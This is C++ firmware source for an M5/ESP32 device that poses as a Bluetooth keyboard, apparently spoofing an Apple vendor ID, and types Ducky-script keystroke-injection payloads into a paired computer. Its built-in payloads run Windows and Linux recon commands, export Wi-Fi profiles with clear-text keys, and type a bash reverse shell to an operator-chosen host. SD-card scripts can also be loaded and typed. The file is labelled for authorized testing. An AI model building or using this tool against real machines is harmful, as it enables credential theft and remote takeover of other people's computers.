#include "BadUsb.h"

#if defined(HAS_SCREEN) && defined(MARAUDER_V8) && defined(HAS_BT)

#include <NimBLEDevice.h>
#include <NimBLEHIDDevice.h>
#include "SharkTheme.h"
#include "Display.h"
#include "MenuFunctions.h"
#include "SDInterface.h"
#include "TouchKeyboard.h"
#include "WiFiScan.h"

extern Display display_obj;
extern MenuFunctions menu_function_obj;
extern SDInterface sd_obj;
extern WiFiScan wifi_scan_obj;

BadUsb bad_usb_obj;

namespace {
  const char* KB_NAME = "M5-SHARK-KB";

  // Same tap threshold the shared dashboards use: the default 600 silently
  // eats light taps through the case, which made the first tool list feel
  // dead. 350 keeps every BadUSB screen as responsive as the prank screens.
  bool badusbTouch(uint16_t* tx, uint16_t* ty) {
    return display_obj.updateTouch(tx, ty, 350);
  }

  // SharkPrank-style key: chamfered top-right corner, center coordinates.
  void badusbKey(int16_t cx, int16_t cy, int16_t w, int16_t h, const char* label,
                 uint16_t fill, uint16_t edge, uint16_t txt, uint8_t font = 2) {
    TFT_eSPI& tft = display_obj.tft;
    const int16_t x = cx - w / 2, y = cy - h / 2, cut = 6;
    tft.fillRect(x, y, w, h, fill);
    tft.fillTriangle(x + w - cut, y, x + w, y, x + w, y + cut, TFT_BLACK);
    tft.drawFastVLine(x, y, h, edge);
    tft.drawFastHLine(x, y + h - 1, w, edge);
    tft.drawFastVLine(x + w - 1, y + cut, h - cut, edge);
    tft.drawLine(x, y, x + w - cut, y, edge);
    tft.drawLine(x + w - cut, y, x + w - 1, y + cut, edge);
    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(txt, fill);
    tft.drawString(label, cx, cy, font);
    tft.setTextDatum(TL_DATUM);
  }

  // Shared screen chrome: status bar, title, underline.
  void badusbFrame(const char* title) {
    TFT_eSPI& tft = display_obj.tft;
    tft.fillScreen(TFT_BLACK);
    menu_function_obj.drawStatusBar();
    const int16_t y0 = STATUS_BAR_WIDTH + 1;
    tft.setTextDatum(ML_DATUM);
    tft.setTextColor(WD_CYAN, TFT_BLACK);
    tft.drawString(title, 6, y0 + 8, 2);
    tft.drawFastHLine(0, y0 + 16, tft.width(), WD_EDGE);
    tft.drawFastHLine(0, y0 + 16, 46, WD_CYAN);
    tft.setTextDatum(TL_DATUM);
  }


  // Standard boot-keyboard HID report map: one 8-byte input report
  // [modifiers, reserved, key1..key6].
  const uint8_t HID_REPORT_MAP[] = {
    0x05, 0x01,  // Usage Page (Generic Desktop)
    0x09, 0x06,  // Usage (Keyboard)
    0xA1, 0x01,  // Collection (Application)
    0x85, 0x01,  //   Report ID (1)
    0x05, 0x07,  //   Usage Page (Key Codes)
    0x19, 0xE0,  //   Usage Min (224)
    0x29, 0xE7,  //   Usage Max (231)
    0x15, 0x00,  //   Logical Min (0)
    0x25, 0x01,  //   Logical Max (1)
    0x75, 0x01,  //   Report Size (1)
    0x95, 0x08,  //   Report Count (8)
    0x81, 0x02,  //   Input (Data,Var,Abs) ; modifier byte
    0x95, 0x01,  //   Report Count (1)
    0x75, 0x08,  //   Report Size (8)
    0x81, 0x01,  //   Input (Const) ; reserved
    0x95, 0x06,  //   Report Count (6)
    0x75, 0x08,  //   Report Size (8)
    0x15, 0x00,  //   Logical Min (0)
    0x25, 0x65,  //   Logical Max (101)
    0x05, 0x07,  //   Usage Page (Key Codes)
    0x19, 0x00,  //   Usage Min (0)
    0x29, 0x65,  //   Usage Max (101)
    0x81, 0x00,  //   Input (Data,Array)
    0xC0         // End Collection
  };

  NimBLEHIDDevice* hid = nullptr;
  NimBLECharacteristic* input = nullptr;
  volatile bool connected = false;

  class ServerCB : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer*, NimBLEConnInfo&) override { connected = true; }
    void onDisconnect(NimBLEServer*, NimBLEConnInfo&, int) override { connected = false; }
  };

  // ASCII (32..126) -> {shift, HID keycode}, US layout.
  struct KeyMap { uint8_t shift; uint8_t code; };

  KeyMap asciiToKey(char c) {
    if (c >= 'a' && c <= 'z') return {0, (uint8_t)(0x04 + (c - 'a'))};
    if (c >= 'A' && c <= 'Z') return {1, (uint8_t)(0x04 + (c - 'A'))};
    if (c >= '1' && c <= '9') return {0, (uint8_t)(0x1E + (c - '1'))};
    switch (c) {
      case '0': return {0, 0x27};
      case ' ': return {0, 0x2C};
      case '-': return {0, 0x2D};  case '_': return {1, 0x2D};
      case '=': return {0, 0x2E};  case '+': return {1, 0x2E};
      case '[': return {0, 0x2F};  case '{': return {1, 0x2F};
      case ']': return {0, 0x30};  case '}': return {1, 0x30};
      case '\\':return {0, 0x31};  case '|': return {1, 0x31};
      case ';': return {0, 0x33};  case ':': return {1, 0x33};
      case '\'':return {0, 0x34};  case '"': return {1, 0x34};
      case '`': return {0, 0x35};  case '~': return {1, 0x35};
      case ',': return {0, 0x36};  case '<': return {1, 0x36};
      case '.': return {0, 0x37};  case '>': return {1, 0x37};
      case '/': return {0, 0x38};  case '?': return {1, 0x38};
      case '!': return {1, 0x1E};  case '@': return {1, 0x1F};
      case '#': return {1, 0x20};  case '$': return {1, 0x21};
      case '%': return {1, 0x22};  case '^': return {1, 0x23};
      case '&': return {1, 0x24};  case '*': return {1, 0x25};
      case '(': return {1, 0x26};  case ')': return {1, 0x27};
    }
    return {0, 0};
  }

  // ---- Built-in payloads (Ducky text, typed by the same line runner) ------
  // Every built-in is a visible, on-screen action on the paired host; nothing
  // is hidden from the operator. Authorized targets only.

  const char DUCK_SELFTEST[] =
    "REM M5 SHARK BLE keyboard self-test\n"
    "DELAY 400\n"
    "STRINGLN M5 SHARK BadUSB (BLE) connected\n";

  // Opens cmd via Win+R and prints identity/interface/account info on screen.
  const char DUCK_WIN_RECON[] =
    "REM Windows recon, visible in a cmd window\n"
    "DELAY 300\n"
    "GUI r\n"
    "DELAY 500\n"
    "STRINGLN cmd /k whoami & hostname & ipconfig /all & net user\n";

  // Exports the host's WLAN profiles (clear-text keys) and opens them.
  const char DUCK_WIN_WIFI[] =
    "REM Export WLAN profiles with keys, then open them\n"
    "DELAY 300\n"
    "GUI r\n"
    "DELAY 500\n"
    "STRINGLN cmd /c netsh wlan export profile key=clear folder=%TEMP% & notepad %TEMP%\\*.xml\n";

  // Opens a terminal (Ctrl+Alt+T) and prints identity info on screen.
  const char DUCK_LINUX_RECON[] =
    "REM Linux recon, visible in a terminal\n"
    "DELAY 300\n"
    "CTRL-ALT t\n"
    "DELAY 1000\n"
    "STRINGLN id; uname -a; ifconfig -a || ip a; echo; echo M5SHARK-RECON-DONE\n";

  // Locks the session instantly (Win+L). Harmless connectivity test.
  const char DUCK_LOCK[] =
    "REM Lock the target session\n"
    "DELAY 200\n"
    "GUI l\n";
}

void BadUsb::releaseKeys() {
  uint8_t report[8] = {0};
  if (input) {
    input->setValue(report, sizeof(report));
    input->notify();
  }
  delay(6);
}

void BadUsb::sendChord(uint8_t modifiers, uint8_t key) {
  if (!input || !connected)
    return;
  uint8_t report[8] = {modifiers, 0, key, 0, 0, 0, 0, 0};
  input->setValue(report, sizeof(report));
  input->notify();
  delay(8);
  releaseKeys();
}

void BadUsb::sendChar(char c) {
  KeyMap k = asciiToKey(c);
  if (k.code == 0)
    return;
  sendChord(k.shift ? 0x02 : 0x00, k.code);   // 0x02 = Left Shift
}

// Modifier name -> HID modifier bit (0 when the token is not a modifier).
uint8_t BadUsb::modFromToken(const String& t) {
  if (t == "CTRL" || t == "CONTROL") return 0x01;
  if (t == "SHIFT") return 0x02;
  if (t == "ALT" || t == "OPTION") return 0x04;
  if (t == "GUI" || t == "WINDOWS" || t == "CMD") return 0x08;
  return 0;
}

// Key name/char -> HID keycode; bit 0x100 marks "needs Shift".
uint16_t BadUsb::keyFromToken(const String& t) {
  if (t == "ENTER" || t == "RETURN") return 0x28;
  if (t == "TAB")   return 0x2B;
  if (t == "SPACE") return 0x2C;
  if (t == "ESC" || t == "ESCAPE") return 0x29;
  if (t == "DEL" || t == "DELETE") return 0x4C;
  if (t == "DOWN")  return 0x51;
  if (t == "UP")    return 0x52;
  if (t.length() == 1) {
    KeyMap k = asciiToKey(t.charAt(0));
    if (k.code) return (uint16_t)k.code | (k.shift ? 0x100 : 0);
  }
  return 0;
}

// Ducky-style line runner. Supported: REM, STRING, STRINGLN, DELAY, ENTER,
// TAB, SPACE, ESC/ESCAPE, and modifier chords. Chords combine freely:
// GUI r, CTRL s, CTRL-ALT t, GUI SHIFT s, CTRL-ALT-DEL. One command per line.
void BadUsb::typeLine(const String& raw) {
  String line = raw;
  line.trim();
  if (line.length() == 0)
    return;

  int sp = line.indexOf(' ');
  String cmd = sp < 0 ? line : line.substring(0, sp);
  String arg = sp < 0 ? String("") : line.substring(sp + 1);
  cmd.toUpperCase();

  if (cmd == "REM")
    return;
  if (cmd == "DELAY") {
    delay((uint32_t)arg.toInt());
    return;
  }
  if (cmd == "STRING") {
    for (uint16_t i = 0; i < arg.length(); i++)
      sendChar(arg.charAt(i));
    return;
  }
  if (cmd == "STRINGLN") {
    for (uint16_t i = 0; i < arg.length(); i++)
      sendChar(arg.charAt(i));
    sendChord(0, 0x28);   // Enter
    return;
  }
  if (cmd == "ENTER") { sendChord(0, 0x28); return; }
  if (cmd == "TAB")   { sendChord(0, 0x2B); return; }
  if (cmd == "SPACE") { sendChord(0, 0x2C); return; }
  if (cmd == "ESC" || cmd == "ESCAPE") { sendChord(0, 0x29); return; }

  // Modifier chords. Hyphens/plus signs split tokens, so "CTRL-ALT t" is
  // three tokens and the first non-modifier token is the key that fires.
  String cmdNorm = cmd;
  cmdNorm.replace('-', ' ');
  cmdNorm.replace('+', ' ');
  cmdNorm.trim();
  int fsp = cmdNorm.indexOf(' ');
  String base = fsp < 0 ? cmdNorm : cmdNorm.substring(0, fsp);
  String rest = fsp < 0 ? String("") : cmdNorm.substring(fsp + 1);

  uint8_t mod = modFromToken(base);
  if (!mod)
    return;

  // Historic special case: bare "CTRL DEL" still means Ctrl+Alt+Del.
  arg.trim();
  if (mod == 0x01 && (arg.equalsIgnoreCase("DEL") || arg.equalsIgnoreCase("DELETE"))) {
    sendChord(0x01 | 0x04, 0x4C);
    return;
  }

  String tokens = rest + " " + arg;
  tokens.replace('-', ' ');
  tokens.replace('+', ' ');

  int idx = 0;
  while (idx < (int)tokens.length()) {
    int nx = tokens.indexOf(' ', idx);
    String tok = nx < 0 ? tokens.substring(idx) : tokens.substring(idx, nx);
    tok.trim();
    if (tok.length()) {
      uint8_t m2 = modFromToken(tok);
      if (m2)
        mod |= m2;
      else {
        uint16_t k = keyFromToken(tok);
        if (k) {
          sendChord(mod | ((k & 0x100) ? 0x02 : 0x00), (uint8_t)(k & 0xFF));
          return;
        }
      }
    }
    if (nx < 0)
      break;
    idx = nx + 1;
  }
  sendChord(mod, 0);   // bare modifier press
}

void BadUsb::runPayload() {
  int start = 0;
  while (start < (int)payload.length() && connected) {
    int nl = payload.indexOf('\n', start);
    String line = nl < 0 ? payload.substring(start) : payload.substring(start, nl);
    line.replace("\r", "");
    typeLine(line);
    if (nl < 0)
      break;
    start = nl + 1;
  }
}

void BadUsb::drawScreen(const char* state, uint16_t color, const char* detail) {
  TFT_eSPI& tft = display_obj.tft;
  const int16_t w = tft.width();

  tft.fillScreen(TFT_BLACK);
  tft.setFreeFont(NULL);
  tft.setTextWrap(false);
  tft.setTextSize(1);

  // Use the shared live HUD here too; NimBLE is already initialized before
  // this screen is drawn, so the Bluetooth lamp visibly turns on.
  menu_function_obj.drawStatusBar();
  tft.setTextDatum(ML_DATUM);
  tft.setTextColor(WD_CYAN, TFT_BLACK);
  tft.drawString("// BADUSB (BLE)", 6, STATUS_BAR_WIDTH + 9, 1);
  tft.setTextDatum(TL_DATUM);
  tft.drawFastHLine(0, STATUS_BAR_WIDTH + 17, w, WD_EDGE);
  tft.drawFastHLine(0, STATUS_BAR_WIDTH + 17, 66, WD_CYAN);

  wdPanel(tft, 10, 40, w - 20, 92, WD_SURFACE, WD_EDGE, WD_CYAN);
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(WD_DIM, WD_SURFACE);
  tft.drawString("DEVICE", 20, 50, 1);
  tft.drawString("STATE", 20, 88, 1);
  tft.setTextColor(WD_WHITE, WD_SURFACE);
  tft.drawString(KB_NAME, 20, 62, 4);
  tft.setTextColor(color, WD_SURFACE);
  tft.drawString(state, 20, 100, 4);

  wdPanel(tft, 10, 142, w - 20, 60, WD_PANEL, WD_EDGE, WD_CYAN);
  tft.setTextColor(WD_DIM, WD_PANEL);
  tft.drawString("PAYLOAD", 20, 150, 1);
  tft.setTextColor(WD_BONE, WD_PANEL);
  tft.drawString(payload_source, 20, 164, 2);
  tft.setTextColor(WD_GREY, WD_PANEL);
  tft.drawString(detail, 20, 184, 1);

  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(WD_GREY, TFT_BLACK);
  tft.drawString("Pair from the target's Bluetooth settings.", w / 2, 224, 1);
  tft.setTextColor(WD_AMBER, TFT_BLACK);
  tft.drawString("Authorized testing only", w / 2, 238, 1);
  wdPanel(tft, 10, 288, w - 20, 24, WD_SURFACE, WD_EDGE, WD_AMBER);
  tft.setTextColor(WD_AMBER, WD_SURFACE);
  tft.drawString("TOUCH TO STOP", w / 2, 300, 2);
  tft.setTextDatum(TL_DATUM);
}

// ---- Tool builders ---------------------------------------------------------

bool BadUsb::buildTypeText() {
  static char text[160] = "Hello from M5 SHARK";
  if (!keyboardInput(text, sizeof(text), "TEXT TO TYPE"))
    return false;
  payload = "DELAY 300\nSTRINGLN ";
  payload += text;
  payload += "\n";
  payload_source = "typed text";
  return true;
}

bool BadUsb::buildRevshell() {
  static char host[40] = "192.168.1.10:4444";
  if (!keyboardInput(host, sizeof(host), "LHOST:LPORT"))
    return false;
  // Typed into an already-open terminal on the authorized target.
  payload = "REM bash reverse shell - authorized target only\n"
            "DELAY 200\n"
            "STRING bash -i >& /dev/tcp/";
  payload += host;
  payload += " 0>&1\nENTER\n";
  payload_source = "revshell ";
  payload_source += host;
  return true;
}

// Pages through every Ducky payload found on the SD card and loads the one
// the operator taps. /SCRIPTS first (the documented home), then /badusb.
bool BadUsb::pickSdPayload() {
  #ifdef HAS_SD
    TFT_eSPI& tft = display_obj.tft;
    const int16_t w = tft.width();

    if (!sd_obj.supported) {
      tft.fillScreen(TFT_BLACK);
      tft.setTextDatum(MC_DATUM);
      tft.setTextColor(WD_RED, TFT_BLACK);
      tft.drawString("NO SD CARD", w / 2, 140, 2);
      tft.setTextColor(WD_GREY, TFT_BLACK);
      tft.drawString("payloads live in /SCRIPTS", w / 2, 168, 1);
      tft.setTextDatum(TL_DATUM);
      delay(1200);
      return false;
    }

    LinkedList<String> files;
    sd_obj.listDirToLinkedList(&files, "/SCRIPTS", ".duck");
    sd_obj.listDirToLinkedList(&files, "/SCRIPTS", ".txt");
    sd_obj.listDirToLinkedList(&files, "/badusb", ".txt");
    if (!files.size()) {
      tft.fillScreen(TFT_BLACK);
      tft.setTextDatum(MC_DATUM);
      tft.setTextColor(WD_AMBER, TFT_BLACK);
      tft.drawString("NO PAYLOADS ON SD", w / 2, 140, 2);
      tft.setTextColor(WD_GREY, TFT_BLACK);
      tft.drawString("drop *.duck into /SCRIPTS", w / 2, 168, 1);
      tft.setTextDatum(TL_DATUM);
      delay(1200);
      return false;
    }

    const uint8_t PER_PAGE = 5;
    const int16_t ROW_Y = 44, ROW_H = 46;   // rows 40px tall, 6px gaps
    uint16_t page = 0;

    while (true) {
      const uint16_t pages = (files.size() + PER_PAGE - 1) / PER_PAGE;
      if (page >= pages) page = pages - 1;

      badusbFrame("// SELECT PAYLOAD");

      for (uint8_t i = 0; i < PER_PAGE; i++) {
        const int16_t idx = page * PER_PAGE + i;
        if (idx >= (int16_t)files.size()) break;
        String name = files.get(idx);
        int slash = name.lastIndexOf('/');
        if (slash >= 0) name = name.substring(slash + 1);
        const int16_t y = ROW_Y + i * ROW_H;
        wdPanel(tft, 8, y, w - 16, 40, WD_PANEL, WD_EDGE, WD_CYAN);
        tft.setTextColor(WD_BONE, WD_PANEL);
        String shown = name;
        while (shown.length() > 3 && tft.textWidth(shown, 2) > w - 36)
          shown.remove(shown.length() - 1);
        tft.drawString(shown, 16, y + 12, 2);
      }

      // Big bottom keys: BACK on the left, page flip on the right.
      badusbKey(60, 296, 104, 38, "BACK", WD_SURFACE, WD_GREY, WD_GREY);
      badusbKey(180, 296, 104, 38,
                pages > 1 ? (String(page + 1) + "/" + String(pages)).c_str() : "1/1",
                WD_SURFACE, WD_AMBER, WD_AMBER);

      uint16_t tx, ty;
      bool picked = false, back = false;
      while (!picked && !back) {
        if (badusbTouch(&tx, &ty)) {
          while (badusbTouch(&tx, &ty))
            delay(10);
          if (ty >= 276) {
            if (tx < 120) back = true;
            else if (pages > 1) page = (page + 1) % pages;
          }
          else if (ty >= ROW_Y && ty < ROW_Y + PER_PAGE * ROW_H - 6) {
            const int16_t idx = page * PER_PAGE + (ty - ROW_Y) / ROW_H;
            if (idx < (int16_t)files.size()) {
              File f = SD.open(files.get(idx), FILE_READ);
              if (f) {
                payload = "";
                while (f.available() && payload.length() < 4096)
                  payload += (char)f.read();
                f.close();
                payload_source = files.get(idx);
                picked = true;
              }
            }
          }
        }
        delay(20);
      }
      if (picked)
        return payload.length() > 0;
      return false;
    }
  #else
    return false;
  #endif
}

// ---- Entry point: the tool list --------------------------------------------

void BadUsb::run() {
  TFT_eSPI& tft = display_obj.tft;

  // 2x4 grid of 110x52 keys (centers): big, easy targets that match the
  // prank screens' touch feel, plus a full-width BACK key.
  //   col centers x = 62 / 178, row centers y = 66 / 124 / 182 / 240
  //   grid hit rows: ty 40..266 (57 px bands), BACK: ty >= 276
  struct Tool { const char* label; };
  const Tool tools[8] = {
    {"SD FILE"},        // pick any /SCRIPTS/*.duck|*.txt
    {"TYPE TEXT"},      // free text via touch keyboard
    {"SELFTEST"},       // types one identifying line
    {"WIN RECON"},      // cmd: whoami/ipconfig/net user on screen
    {"WIFI KEYS"},      // netsh export key=clear + notepad
    {"LINUX"},          // terminal: id/uname/ifconfig
    {"REVSHELL"},       // parameterized bash TCP one-liner
    {"LOCK"},           // Win+L
  };

  while (true) {
    badusbFrame("// BADUSB TOOLS");
    tft.setFreeFont(NULL);
    tft.setTextWrap(false);
    tft.setTextSize(1);

    for (uint8_t i = 0; i < 8; i++) {
      const int16_t cx = (i % 2 == 0) ? 62 : 178;
      const int16_t cy = 66 + (i / 2) * 58;
      badusbKey(cx, cy, 110, 52, tools[i].label, WD_PANEL, WD_CYAN, WD_BONE);
    }
    badusbKey(120, 296, 224, 38, "BACK", WD_SURFACE, WD_GREY, WD_GREY);

    uint16_t tx, ty;
    int8_t pick = -1;
    while (pick < 0) {
      if (badusbTouch(&tx, &ty)) {
        while (badusbTouch(&tx, &ty))
          delay(10);
        if (ty >= 276)
          return;
        if (ty >= 40 && ty < 266)
          pick = ((ty - 40) / 58) * 2 + (tx < 120 ? 0 : 1);
      }
      else
        delay(20);
    }

    bool ready = false;
    switch (pick) {
      case 0: ready = pickSdPayload(); break;
      case 1: ready = buildTypeText(); break;
      case 2: payload = DUCK_SELFTEST;     payload_source = "self test";    ready = true; break;
      case 3: payload = DUCK_WIN_RECON;    payload_source = "win recon";    ready = true; break;
      case 4: payload = DUCK_WIN_WIFI;     payload_source = "win wifi keys"; ready = true; break;
      case 5: payload = DUCK_LINUX_RECON;  payload_source = "linux recon";  ready = true; break;
      case 6: ready = buildRevshell(); break;
      case 7: payload = DUCK_LOCK;         payload_source = "lock target";  ready = true; break;
    }
    if (ready)
      executePayload();
  }
}

// ---- The pair-and-type flow (unchanged interaction model) ------------------

void BadUsb::executePayload() {
  connected = false;

  // Guarded bring-up: refuses (instead of crashing) when the BT crash guard
  // has locked BLE after a previous init abort.
  if (!wifi_scan_obj.ensureBLE(KB_NAME)) {
    drawScreen("BT LOCKED", WD_RED, "BLE crash guard active.");
    delay(1500);
    return;
  }
  NimBLEDevice::setSecurityAuth(true, false, true);   // bond, no MITM, SC
  NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);

  NimBLEServer* server = NimBLEDevice::createServer();
  server->setCallbacks(new ServerCB());

  hid = new NimBLEHIDDevice(server);
  input = hid->getInputReport(1);
  hid->setManufacturer("M5 SHARK");
  hid->setPnp(0x02, 0x05AC, 0x820A, 0x0001);
  hid->setHidInfo(0x00, 0x01);
  hid->setReportMap((uint8_t*)HID_REPORT_MAP, sizeof(HID_REPORT_MAP));
  hid->startServices();

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->setName(KB_NAME);
  adv->setAppearance(0x03C1);   // HID Keyboard
  adv->addServiceUUID(hid->getHidService()->getUUID());
  adv->enableScanResponse(true);
  adv->start();

  drawScreen("ADVERTISING", WD_AMBER, "Waiting for a host to pair...");

  bool was_connected = false;
  uint16_t tx, ty;
  while (true) {
    if (badusbTouch(&tx, &ty)) {
      while (badusbTouch(&tx, &ty))
        delay(10);
      break;
    }

    if (connected && !was_connected) {
      was_connected = true;
      drawScreen("CONNECTED", WD_CYAN, "Typing payload...");
      delay(600);              // let the host finish HID setup
      runPayload();
      drawScreen("CONNECTED", WD_CYAN, "Payload sent. Touch to stop.");
    }
    else if (!connected && was_connected) {
      was_connected = false;
      drawScreen("ADVERTISING", WD_AMBER, "Host disconnected. Re-pair...");
    }

    delay(20);
  }

  // Soft teardown (full deinit asserts inside the C5's ROM controller when
  // events are queued — see WiFiScan::bleSoftStop).
  wifi_scan_obj.bleSoftStop();
  wifi_scan_obj.ble_initialized = false;
  hid = nullptr;
  input = nullptr;
}

#endif
